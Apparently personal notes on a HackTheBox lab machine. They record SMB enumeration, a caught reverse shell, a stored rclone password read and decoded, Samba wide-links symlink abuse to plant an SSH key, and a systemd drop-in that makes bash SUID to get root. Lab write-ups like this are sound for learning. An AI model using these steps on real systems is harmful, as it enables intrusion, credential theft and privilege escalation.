
Pasted image 20260729180334.png




```
nmap -sCV -A 10.129.244.177
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-29 05:57 -0400
Nmap scan report for 10.129.244.177
Host is up (0.18s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 5m45s
|_nbstat: NetBIOS name: ABDUCTED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-07-29T10:03:34
|_  start_date: N/A

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   185.68 ms 10.10.14.1
2   185.87 ms 10.129.244.177


```


add nano /etc/hosts  

![[Pasted image 20260729163912.png]]

```
rpcclient -U "" -N 10.129.244.177
rpcclient $> enumdomusers
user:[scott] rid:[0x3e8]
rpcclient $> querydispinfo
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: scott    Name: Scott Mercer      Desc: 
rpcclient $> netshareenum
netname: HP-Reception
        remark: Reception printer
        path:   C:\var\spool\samba
        password:
netname: projects
        remark: Hartley Group Project Files
        path:   C:\srv\projects
        password:
netname: transfer
        remark: Staff file transfer
        path:   C:\srv\transfer
        password:
rpcclient $> enumprinters
        flags:[0x800000]
        name:[\\10.129.244.177\]
        description:[\\10.129.244.177\,,Reception printer]
        comment:[Reception printer]

rpcclient $> 

```

```
nmap --script smb-os-discovery,smb-protocols,smb2-security-mode -p445  10.129.244.177

Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-29 06:40 -0400
Nmap scan report for abducted.htb (10.129.244.177)
Host is up (0.18s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-protocols: 
|   dialects: 
|     2.0.2
|     2.1
|     3.0
|     3.0.2
|_    3.1.1

Nmap done: 1 IP address (1 host up) scanned in 2.97 seconds
   
```

![[Pasted image 20260729164833.png]]

![[Pasted image 20260729164903.png]]

```
nc -lvnp 4444  
listening on [any] 4444 ...
connect to [10.10.14.60] from (UNKNOWN) [10.129.244.177] 59646
bash: cannot set terminal process group (1803): Inappropriate ioctl for device
bash: no job control in this shell
nobody@abducted:/var/spool/samba$ 
```


```
nc -lvnp 4444  
listening on [any] 4444 ...
connect to [10.10.14.60] from (UNKNOWN) [10.129.244.177] 59646
bash: cannot set terminal process group (1803): Inappropriate ioctl for device
bash: no job control in this shell
nobody@abducted:/var/spool/samba$ id
id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
nobody@abducted:/var/spool/samba$ find / -type f -name "*.conf" 2>/dev/null | grep -Ev "^/usr/|^/etc/"
<ame "*.conf" 2>/dev/null | grep -Ev "^/usr/|^/etc/"
/var/lib/ucf/cache/:etc:samba:smb.conf
/var/lib/ucf/cache/:etc:rsyslog.d:50-default.conf
/opt/offsite-backup/rclone.conf
/run/tmpfiles.d/static-nodes.conf
/run/systemd/resolve/resolv.conf
/run/systemd/resolve/stub-resolv.conf
nobody@abducted:/var/spool/samba$ cat /opt/offsite-backup/rclone.conf
cat /opt/offsite-backup/rclone.conf
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
nobody@abducted:/var/spool/samba$ 

```

pass: iXzvcib3SrpZ
user: marcus, scott



```
rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
iXzvcib3SrpZ
      
```

![[Pasted image 20260729165642.png]]


```
ssh scott@abducted.htb                                                                      

The authenticity of host 'abducted.htb (10.129.244.177)' can't be established.
ED25519 key fingerprint is: SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:77: [hashed name]
    ~/.ssh/known_hosts:80: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'abducted.htb' (ED25519) to the list of known hosts.
scott@abducted.htb's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-124-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Jul 29 11:04:00 AM UTC 2026

  System load:           0.0
  Usage of /:            58.8% of 5.50GB
  Memory usage:          7%
  Swap usage:            0%
  Processes:             217
  Users logged in:       0
  IPv4 address for eth0: 10.129.244.177
  IPv6 address for eth0: dead:beef::250:56ff:fe95:117c

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
1 of these updates is a standard security update.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Wed Jul 29 11:04:01 2026 from 10.10.14.60
scott@abducted:~$ id
uid=1000(scott) gid=1001(scott) groups=1001(scott)
scott@abducted:~$ ls
user.txt
scott@abducted:~$ cat user.txt
42f70a18866a1f665c171d0ffcebdcd3
scott@abducted:~$ cl

```

```
scott@abducted:~$ sudo -l
[sudo] password for scott: 
Sorry, user scott may not run sudo on abducted.
scott@abducted:~$ cat /etc/samba/smb.conf
[global]
   workgroup = WORKGROUP
   server string = Hartley Group Document Services
   netbios name = ABDUCTED
   map to guest = Bad User
   guest account = nobody
   security = user
   printing = sysv
   load printers = no
   disable spoolss = no
   unix extensions = no
   allow insecure wide links = yes
   log level = 0
   include = /etc/samba/shares.conf
scott@abducted:~$ cat /etc/samba/shares.conf
[HP-Reception]
   comment = Reception printer
   path = /var/spool/samba
   printable = yes
   guest ok = yes
   print command = /usr/local/bin/printaudit %J %s
   lpq command = /bin/true
   lprm command = /bin/true

[projects]
   comment = Hartley Group Project Files
   path = /srv/projects
   valid users = scott
   read only = no
   browseable = yes

[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes
scott@abducted:~$ ln -s /home/marcus /srv/transfer/marcus
scott@abducted:~$ 

```

```
smbclient  //10.129.244.177/transfer -U 'scott%iXzvcib3SrpZ'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 29 07:53:57 2026
  ..                                  D        0  Wed Jul 29 07:53:57 2026
  marcus                              D        0  Thu Jun  4 09:47:57 2026

                5768764 blocks of size 1024. 2304672 blocks available
smb: \> cd marcus
smb: \marcus\> ls
  .                                   D        0  Thu Jun  4 09:47:57 2026
  ..                                  D        0  Thu Jun  4 09:41:30 2026
  .profile                            H      807  Sun Mar 31 04:41:03 2024
  .bash_logout                        H      220  Sun Mar 31 04:41:03 2024
  .bash_history                       H        0  Thu Jun  4 09:47:57 2026
  .bashrc                             H     3771  Sun Mar 31 04:41:03 2024
  .cache                             DH        0  Thu Jun  4 09:41:30 2026

                5768764 blocks of size 1024. 2304660 blocks available
smb: \marcus\> mkdir .ssh
smb: \marcus\> cd .ssh
smb: \marcus\.ssh\> put /home/kali/.ssh/id_rsa.pub authorized_keys
/home/kali/.ssh/id_rsa.pub does not exist
smb: \marcus\.ssh\> putting file /home/kali/.ssh/id_rsa.pub as \marcus\.ssh\authorized_keys
putting: command not found
smb: \marcus\.ssh\> setmode authorized_keys a-r
cli_getatr failed: NT_STATUS_OBJECT_NAME_NOT_FOUND
cli_getatr failed: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \marcus\.ssh\> cd ..
smb: \marcus\> setmode .ssh a-r+d
setmode <filename> <perm=[+|-]rsha>
smb: \marcus\> ssh-keygen -t rsa -b 4096
ssh-keygen: command not found
smb: \marcus\> cd .ssh
smb: \marcus\.ssh\> put /home/kali/.ssh/id_rsa.pub authorized_keys
/home/kali/.ssh/id_rsa.pub does not exist
smb: \marcus\.ssh\> ssh-keygen -t rsa -b 4096
ssh-keygen: command not found
smb: \marcus\.ssh\> put /root/.ssh/id_rsa.pub authorized_keys
putting file /root/.ssh/id_rsa.pub as \marcus\.ssh\authorized_keys (1.3 kB/s) (average 1.3 kB/s)
smb: \marcus\.ssh\> setmode authorized_keys a-r
smb: \marcus\.ssh\> cd ..
smb: \marcus\> setmode .ssh a-r+d
setmode <filename> <perm=[+|-]rsha>
smb: \marcus\> The connection is disconnected now: NT_STATUS_CONNECTION_DISCONNECTED


```


```
ssh-keygen -t rsa -b 4096
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase for "/root/.ssh/id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:3Kmlu+1DRAF3UEAAmmN7VBw1mc4MWxZFgJBjP2VVRdQ root@kali
The key's randomart image is:
+---[RSA 4096]----+
|      o==B@&*..+=|
|     o+.+.Oo    E|
|    =..o %       |
|   . + .+.=.     |
|    . . So+      |
|     .   +.      |
|        o.       |
|         o.      |
|        ooo.     |
+----[SHA256]-----+
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# ssh -i /home/kali/.ssh/id_rsa marcus@abducted.htb

Warning: Identity file /home/kali/.ssh/id_rsa not accessible: No such file or directory.
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-124-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Jul 29 12:02:40 PM UTC 2026

  System load:           0.08
  Usage of /:            58.9% of 5.50GB
  Memory usage:          7%
  Swap usage:            0%
  Processes:             223
  Users logged in:       1
  IPv4 address for eth0: 10.129.244.177
  IPv6 address for eth0: dead:beef::250:56ff:fe95:117c

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
1 of these updates is a standard security update.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Wed Jul 29 12:02:41 2026 from 10.10.14.60
marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
marcus@abducted:~$ find / -group operators 2>/dev/null
/etc/systemd/system/smbd.service.d
marcus@abducted:~$ cat > /etc/systemd/system/smbd.service.d/privesc.conf << 'EOF'
[Service]
ExecStartPre=/bin/bash -c 'chmod +s /bin/bash'
EOF
marcus@abducted:~$ systemctl daemon-reload
marcus@abducted:~$ systemctl restart smbd
id
bash -p
    
marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
marcus@abducted:~$ bash -p
bash-5.2# 
bash-5.2# whoami
root
bash-5.2# cat /root/root.txt
2ea3cfa1f430e4db5c6e12ba4b4d8dd1
bash-5.2# 

```


![[Screenshot_25.png]]
